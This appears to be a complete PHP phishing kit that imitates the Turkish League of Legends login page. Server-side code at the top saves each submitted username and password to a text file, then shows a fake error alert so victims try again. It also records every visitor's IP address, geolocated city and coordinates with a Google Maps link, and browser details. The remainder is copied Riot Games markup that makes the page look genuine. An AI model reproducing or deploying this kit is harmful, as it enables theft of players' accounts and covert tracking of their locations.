<?php  

if (isset($_POST['login']) && isset($_POST['password'])) {

$ac = fopen("kayit.txt","a+");
$username = $_POST['login'];
$password = $_POST['password'];
$userlar = ("\n Username : ".$username."\n Password : ".$password."\n__________________ \n");
fwrite($ac,$userlar);
fclose($ac);
echo "<script>alert('Kullanıcı Adınızı veya Şifrenizi kontrol ediniz!');</script>";
}

else{
date_default_timezone_set('Europe/Istanbul');

function GetIP(){
 if(getenv("HTTP_CLIENT_IP")) {
 $ip = getenv("HTTP_CLIENT_IP");
 } elseif(getenv("HTTP_X_FORWARDED_FOR")) {
 $ip = getenv("HTTP_X_FORWARDED_FOR");
 if (strstr($ip, ',')) {
 $tmp = explode (',', $ip);
 $ip = trim($tmp[0]);
 }
 } else {
 $ip = getenv("REMOTE_ADDR");
 }
 return $ip;
}

$ip = GetIP();


$tarih =" Tarih : ".date('d/m/Y  H:i');

$Geo_Plugin_XML = simplexml_load_file("http://www.geoplugin.net/xml.gp?ip=".$ip); 
$adress = $Geo_Plugin_XML->geoplugin_request; 
$ulke = $Geo_Plugin_XML->geoplugin_countryName;
$bolge = $Geo_Plugin_XML->geoplugin_region;
$kita = $Geo_Plugin_XML->geoplugin_continentCode;
$ulkekodu = $Geo_Plugin_XML->geoplugin_countryCode;
$sehir = $Geo_Plugin_XML->geoplugin_city;
$plaka = $Geo_Plugin_XML->geoplugin_regionCode;
$enlem = $Geo_Plugin_XML->geoplugin_latitude;
$boylam = $Geo_Plugin_XML->geoplugin_longitude;
$tarayici = $_SERVER['HTTP_USER_AGENT']; 

$maps = "https://www.google.com/maps/place/".$enlem.",".$boylam."/@".$enlem.",".$boylam.",16z";
$yamanefkar["0"] = " Ip Adresi : ".$adress;
$yamanefkar["1"] = " Ulke : ".$ulke; 
$yamanefkar["2"] = " Bolge : ".$bolge;
$yamanefkar["3"] = " Kita : ".$kita;
$yamanefkar["4"] = " Ulke Kodu : ".$ulkekodu;
$yamanefkar["5"] = " Sehir : ".$sehir;
$yamanefkar["6"] = " Plaka : ".$plaka;
$yamanefkar["7"] = " Enlem : ".$enlem;
$yamanefkar["8"] = " Boylam : ".$boylam;
$yamanefkar["9"] = " Google Maps : ".$maps;
$yamanefkar["10"] = " Tarayıcı : ".$tarayici; 


$ac = fopen("kayit.txt","a+");

$userlar = ("\n __________________ \n".$tarih."\n".$yamanefkar["0"]."\n".$yamanefkar["1"]."\n".$yamanefkar["2"]."\n".$yamanefkar["3"]."\n".$yamanefkar["4"]."\n".$yamanefkar["5"]."\n".$yamanefkar["6"]."\n".$yamanefkar["7"]."\n".$yamanefkar["8"]."\n".$yamanefkar["9"]."\n".$yamanefkar["10"]."\n\n!--VERİLER--!\n");
fwrite($ac,$userlar);
fclose($ac);
sleep(2);




}

 ?>

<html lang="tr"><head>
<meta charset="utf-8">
<title data-i18n="">League of Legends hesabınla giriş yap</title>
<meta name="google" content="notranslate">
<meta name="viewport" content="width=device-width, user-scalable=no, maximum-scale=1.0">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<link rel="stylesheet" href="https://lolstatic-a.akamaihd.net/rso-login-page/1.4.33/rso-login-page.css">

<script type="application/json" id="config">{"ga":"UA-5859958-25","cdn":"https://lolstatic-a.akamaihd.net/rso-login-page/1.4.33","recaptcha":"6LcGEv8SAAAAAPUTwLPaiMfnJNfedmGj4oww8ITT","remember":true,"trustedDeviceEnabled":true,"links":{"forgot-username":"https://recovery.riotgames.com/{bcp47Lang}/forgot-username?region={regionName}","support-kr":"https://signup.leagueoflegends.co.kr/Customer/faq.php","forgot-password":"https://recovery.riotgames.com/{bcp47Lang}/forgot-password?region={regionName}","eula":"http://{region}.leagueoflegends.com/{lang}/legal/eula","terms":"http://{region}.leagueoflegends.com/{lang}/legal/termsofuse","about-trusted-devices":"https://support.riotgames.com/hc/articles/360010366413","privacy":"http://{region}.leagueoflegends.com/{lang}/legal/privacy","privacy-kr":"http://www.leagueoflegends.co.kr/?m=rules&cid=2","terms-kr":"http://www.leagueoflegends.co.kr/?m=rules&cid=1","eula-kr":"http://www.leagueoflegends.co.kr/?m=rules&cid=3","forgot-password-kr":"https://signup.leagueoflegends.co.kr/Member/search03.php","support":"https://support.riotgames.com/hc/{lang}","forgot-username-kr":"https://signup.leagueoflegends.co.kr/Member/search01.php","account-recovery":"https://support.riotgames.com/hc/requests/new?ticket_form_id=72416","signup":"https://signup.{region}.leagueoflegends.com/{lang}","signup-kr":"https://signup.leagueoflegends.co.kr/Member/join01.php","signup-pbe":"https://pbesignup.na.leagueoflegends.com/{posixLang}/pbe"},"languages":[{"code":"en_US","name":"English"},{"code":"cs_CZ","name":"Čeština"},{"code":"de_DE","name":"Deutsch"},{"code":"el_GR","name":"Ελληνικά"},{"code":"es_ES","name":"Español"},{"code":"es_MX","name":"Español (Latinoamérica)"},{"code":"fr_FR","name":"Français"},{"code":"hu_HU","name":"Magyar"},{"code":"it_IT","name":"Italiano"},{"code":"pl_PL","name":"Polski"},{"code":"pt_BR","name":"Português do Brasil"},{"code":"ro_RO","name":"Română"},{"code":"ru_RU","name":"Русский"},{"code":"tr_TR","name":"Türkçe"},{"code":"ja_JP","name":"日本語"},{"code":"ko_KR","name":"한국어"}],"regions":[{"name":"BR1","value":"Brazil","l10n":"REGION_BR","urlName":"br"},{"name":"EUN1","value":"EU Nordic & East","l10n":"REGION_EUNE","urlName":"eune"},{"name":"EUW1","value":"EU West","l10n":"REGION_EUW","urlName":"euw"},{"name":"JP1","value":"Japan","l10n":"REGION_JP","urlName":"jp"},{"name":"KR","value":"Korea","l10n":"REGION_KR","urlName":"kr"},{"name":"LA1","value":"Latin America North","l10n":"REGION_LAN","urlName":"lan"},{"name":"LA2","value":"Latin America South","l10n":"REGION_LAS","urlName":"las"},{"name":"NA1","value":"North America","l10n":"REGION_NA","urlName":"na"},{"name":"OC1","value":"Oceania","l10n":"REGION_OCE","urlName":"oce"},{"name":"PBE1","value":"Public Beta","l10n":"REGION_PBE","urlName":"pbe"},{"name":"RU","value":"Russia","l10n":"REGION_RU","urlName":"ru"},{"name":"TR1","value":"Turkey","l10n":"REGION_TR","urlName":"tr"}],"defaultRegion":"","httpLogout":["https://login.leagueoflegends.com/end-session","https://login.lolesports.com/end-session","https://login.riotgames.com/end-session"],"collectorServerName":"prod02.kaxsdc.com","merchantId":108000,"kountEnabled":true}</script>
<script src="https://lolstatic-a.akamaihd.net/riotbar/prod/latest/tr_TR-defer-cookie-policy-v2.js"></script><script type="text/javascript" charset="utf-8" async="" src="https://lolstatic-a.akamaihd.net/rso-login-page/1.4.33/rso-login-page.0.js"></script><script src="https://www.google-analytics.com/analytics.js"></script><script src="https://prod02.kaxsdc.com/collect/sdk?m=108000&amp;s=c9ec1b67cd434d9da0593aaec257a13e"></script></head>
<body class=" fonts-loaded">
<script src="https://lolstatic-a.akamaihd.net/rso-login-page/1.4.33/rso-login-page.js"></script>


<div><div id="rso-login-wrap" class="auth-rso-login-page"><header id="login-header"><div class="logo"></div></header><div class="panel-frame "><div class="panel-content"><span><div class="spinner-content"><header class="header-wrapper"><h1 class="header-heading">GİRİŞ YAP</h1><hr class="header-hr"></header><span></span>



  <form action="" method="POST"><div class=""><label>Kullanıcı Adı</label><input type="text" class="form-control" name="login" value=""></div><div class=""><label>Şifre</label><input type="password" class="form-control" name="password" value=""></div><div class=""><label class="custom-checkbox"><input type="checkbox" value="1"><span class="checkbox-image"></span><span class="label">Beni hatırla</span></label></div><div class="form-group " id="region-selector" name="region"><label>Bölge</label><span class="placeholder"><span class="placeholder-text">Türkiye</span><span class="placeholder-caret"></span></span></div><p class="submit ">


    <button i type="submit" class="btn-primary" >GİRİŞ YAP</button></p><div class="help"><div class="forgot"><p><a href="https://recovery.riotgames.com/tr/forgot-username?region=TR1">Kullanıcı Adımı Unuttum</a></p><p><a href="https://recovery.riotgames.com/tr/forgot-password?region=TR1">Şifremi Unuttum</a></p></div><div class="signup"><p><a href="https://signup.tr.leagueoflegends.com/tr">Hesap oluşturmak ister misin?</a></p></div></div><div class="lang "><div class="form-group " id="language-selector"><label>Dil</label><span class="placeholder"><span class="placeholder-text">Türkçe</span><span class="placeholder-caret"></span></span></div></div></form>






</div></span></div><div class="panel-frame-sub-border"></div></div><div id="login-footer"><span><div class="spinner-content"><img class="logo" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAGwAAAAlCAYAAACnMQxpAAAACXBIWXMAAAOKAAADigGnjPUfAAAFHGlUWHRYTUw6Y29tLmFkb2JlLnhtcAAAAAAAPD94cGFja2V0IGJlZ2luPSLvu78iIGlkPSJXNU0wTXBDZWhpSHpyZVN6TlRjemtjOWQiPz4gPHg6eG1wbWV0YSB4bWxuczp4PSJhZG9iZTpuczptZXRhLyIgeDp4bXB0az0iQWRvYmUgWE1QIENvcmUgNS42LWMxNDIgNzkuMTYwOTI0LCAyMDE3LzA3LzEzLTAxOjA2OjM5ICAgICAgICAiPiA8cmRmOlJERiB4bWxuczpyZGY9Imh0dHA6Ly93d3cudzMub3JnLzE5OTkvMDIvMjItcmRmLXN5bnRheC1ucyMiPiA8cmRmOkRlc2NyaXB0aW9uIHJkZjphYm91dD0iIiB4bWxuczp4bXA9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC8iIHhtbG5zOmRjPSJodHRwOi8vcHVybC5vcmcvZGMvZWxlbWVudHMvMS4xLyIgeG1sbnM6cGhvdG9zaG9wPSJodHRwOi8vbnMuYWRvYmUuY29tL3Bob3Rvc2hvcC8xLjAvIiB4bWxuczp4bXBNTT0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL21tLyIgeG1sbnM6c3RFdnQ9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9zVHlwZS9SZXNvdXJjZUV2ZW50IyIgeG1wOkNyZWF0b3JUb29sPSJBZG9iZSBQaG90b3Nob3AgQ0MgMjAxOCAoV2luZG93cykiIHhtcDpDcmVhdGVEYXRlPSIyMDE5LTA0LTIzVDE1OjE3OjIyLTA3OjAwIiB4bXA6TW9kaWZ5RGF0ZT0iMjAxOS0wNC0yM1QxNToxODozMS0wNzowMCIgeG1wOk1ldGFkYXRhRGF0ZT0iMjAxOS0wNC0yM1QxNToxODozMS0wNzowMCIgZGM6Zm9ybWF0PSJpbWFnZS9wbmciIHBob3Rvc2hvcDpDb2xvck1vZGU9IjMiIHBob3Rvc2hvcDpJQ0NQcm9maWxlPSJzUkdCIElFQzYxOTY2LTIuMSIgeG1wTU06SW5zdGFuY2VJRD0ieG1wLmlpZDoxOGFiMTM1Yi1iZDE1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" alt="Riot Games"><p class="links"><span><a href="https://support.riotgames.com/hc/tr">Destek</a>  | </span><span><a href="http://tr.leagueoflegends.com/tr/legal/privacy">Gizlilik</a>  | </span><span><a href="http://tr.leagueoflegends.com/tr/legal/termsofuse">Yasal</a> </span></p><p class="legal">©<span class="year"> 2019 </span> Riot Games Inc. Her hakkı saklıdır. Riot Games, League of Legends ve PvP.net; Riot Games, Inc.'nin tescilli markaları, ticari markaları ya da hizmet markalarıdır.</p></div></span></div></div></div><iframe id="ibody" src="https://prod02.kaxsdc.com/logo.htm?m=108000&amp;s=c9ec1b67cd434d9da0593aaec257a13e" style="border: 0px; height: 0px; width: 0px; position: absolute;"></iframe></body></html>